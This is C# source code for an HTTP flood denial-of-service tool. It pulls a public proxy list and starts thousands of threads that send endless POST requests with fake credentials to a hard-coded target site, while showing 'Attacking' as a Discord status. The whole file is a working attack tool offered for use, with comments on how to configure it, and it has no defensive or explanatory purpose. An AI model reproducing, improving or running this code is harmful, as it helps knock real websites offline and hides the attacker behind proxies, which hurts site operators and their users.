using System;
using System.Net;
using System.Text;
using System.Threading;
using DiscordRPC;

namespace Scripto
{
    class Program
    {
        static int Threads = 2000; // Works only without proxy
        static int ThredsPerProxy = 100; // Threads per proxy
        static string Url = "http://www.raidzera.xyz/"; // URL with https://
        static bool proxyEnabled = true; // Enable or disable the proxy
        static bool writeResponse = false; // Enable or disable the request response output
        static int attackCount = 0; // Not touch
        static string method = "POST"; // GET or POST
        static string postdata = $"username=PHB&password=123456789"; // Post form data.

        static DiscordRpcClient client;

        static void Main(string[] args)
        {
            /* Rich Presence */
            client = new DiscordRpcClient("900888004460179456");
            client.Initialize();
            client.SetPresence(new RichPresence()
            {
                Details = "Attacking",
                State = $"Attack on {Url}",
                Assets = new Assets()
                {
                    LargeImageKey = "ih8ptjv",
                    LargeImageText = "by HAHAHA",
                    SmallImageKey = "ih8ptjv"
                }
            });

            if (proxyEnabled)
            {
                String proxylist = new WebClient().DownloadString("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt");
                String[] proxySplitted = proxylist.Split("\n");
                for (int i = 0; i < proxySplitted.Length; i++)
                {
                    String[] proxy = proxySplitted[i].Split(":");
                    for (int e = 0; e < ThredsPerProxy; e++)
                    {
                        Thread iniciar = new Thread(() => Atacar(proxy[0], int.Parse(proxy[1])));
                        iniciar.Start();
                    }
                }
            }
            else
            {
                for (int i = 0; i <= Threads; i++)
                {
                    Thread iniciar = new Thread(() => Atacar("", 0));
                    iniciar.Start();
                }
            }
        }

        static void Atacar(string ip, int port)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            if (proxyEnabled)
            {
                WebProxy myproxy = new WebProxy(ip, port);
                myproxy.BypassProxyOnLocal = false;
                request.Proxy = myproxy;
                Console.WriteLine($"{attackCount} | Attack with proxy: {ip}:{port}");
            }
            request.Method = method;
            if (method == "POST")
            {
                var data = Encoding.ASCII.GetBytes(postdata);
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
            }
            while (true)
            {
                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    if (!proxyEnabled) Console.WriteLine($"{attackCount} | Attack without proxy");
                    if (writeResponse)
                    {
                        WebHeaderCollection header = response.Headers;
                        var encoding = ASCIIEncoding.ASCII;
                        using (var reader = new System.IO.StreamReader(response.GetResponseStream(), encoding))
                        {
                            string responseText = reader.ReadToEnd();
                            Console.WriteLine(responseText);
                        }
                    }
                }
                catch
                {
                }
                attackCount++;
            }
        }
    }
}
